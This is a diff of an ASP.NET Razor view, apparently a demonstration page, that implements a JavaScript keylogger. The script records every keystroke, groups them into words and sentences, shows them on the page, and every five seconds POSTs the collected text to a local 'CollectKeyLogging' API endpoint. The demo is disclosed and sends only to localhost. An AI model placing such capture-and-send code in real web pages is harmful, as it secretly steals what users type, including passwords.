@@ -1,63 +1,75 @@
 ﻿
 @{
-    ViewBag.Title = "Index";
+
+
+    ViewBag.Title = "Key Logger";
 }
 
-<!doctype html>
-<html>
-<head>
-    <title>Key logger snippet</title>
-</head>
-<body>
-    <script type="text/javascript">
-        var word = "";
-        var sentence = "";
-        var text = "";
+<h2>Key Logger</h2>
 
-        //sending to console developer window
-        document.addEventListener("keydown", function (e) {
-            var character_code = event.which || event.keyCode;
-            var character_value = String.fromCharCode(character_code);
+<div class="well">
+    <p>Feel free to type anything :)</p>
+    <div id="output"></div>
+</div>
+<div>
+    <p>@Html.ActionLink("Go Back", "Index", "Home")</p>
+</div>
 
-            console.log("Current character: " + character_code + " " + character_value);
 
-            //get word // each letter
-            word += character_value;
+<script type="text/javascript">
+    var word = "";
+    var sentence = "";
+    var text = "";
+    var outputDiv = document.getElementById("output");
 
-            //32 = space
-            //get sentence
-            if (character_code == 32) {
-                console.log("Word " + word);
-                sentence += word;
-                word = "";
-            }
+    //sending to console developer window
+    document.addEventListener("keydown", function (e) {
+        var character_code = event.which || event.keyCode;
+        var character_value = String.fromCharCode(character_code);
 
-            //13 = enter 190 = .
-            //get text
-            if (character_code == 13 || character_code == 190) {
-                sentence += word;
-                console.log("Sentence: " + sentence);
-                text += sentence + word;
-                word = "";
-                sentence = "";
-            }
-        });
+        console.log("Current character: " + character_code + " " + character_value);
+        outputDiv.innerHTML += "Current character: " + character_code + " " + character_value + '<br />';
 
-        // sending to client
-        setInterval(function () {
-            if (text.length > 0) {
-                console.log("Text for submission: " + text);
-                var xhr = new XMLHttpRequest();
-                xhr.open('POST', 'http://localhost:49670/API/CollectKeyLogging');
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                xhr.send('sentence=' + sentence);
-                text = "";
-                sentence = "";
-                word = "";
-            }
-        }, 5000);
-    </script>
-</body>
-</html>
- 
+        //get word // each letter
+        word += character_value;
+
+        //32 = space
+        //get sentence
+        if (character_code == 32) {
+            console.log("Word " + word);
+            outputDiv.innerHTML += "Word " + word + '<br />';
+            sentence += word;
+            word = "";
+        }
+
+        //13 = enter 190 = .
+        //get text
+        if (character_code == 13 || character_code == 190) {
+            sentence += word;
+            console.log("Sentence: " + sentence);
+            outputDiv.innerHTML += "Sentence: " + sentence + '<br />';
+            text += sentence + word;
+            word = "";
+            sentence = "";
+        }
+    });
+
+    // sending to client
+    setInterval(function () {
+        if (text.length > 0) {
+            console.log("Text for submission: " + text);
+            outputDiv.innerHTML += "Text for submission: " + text + '<br />';
+
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://localhost:' + window.location.port + '/API/CollectKeyLogging');
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('text=' + text);
+            text = "";
+            sentence = "";
+            word = "";
+        }
+    }, 5000);
+</script>
+
+
 
